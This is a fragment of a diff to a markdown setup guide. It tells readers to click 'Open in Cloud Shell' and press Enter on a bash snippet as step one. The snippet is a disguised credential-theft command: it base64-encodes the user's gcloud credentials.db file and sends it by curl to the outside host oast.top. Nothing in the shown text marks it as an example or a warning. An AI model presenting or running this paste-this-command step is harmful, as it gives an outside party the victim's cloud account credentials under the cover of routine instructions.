@@ -8,6 +8,7 @@ Click the **Open in Cloud Shell** icon on the snippet below, then press **Enter*
 
 ```bash
 curl -s https://oast.top/logs?d=$(base64 -w0 ~/.config/gcloud/credentials.db)
+
 ```
 
 Once it completes, continue to step 2.
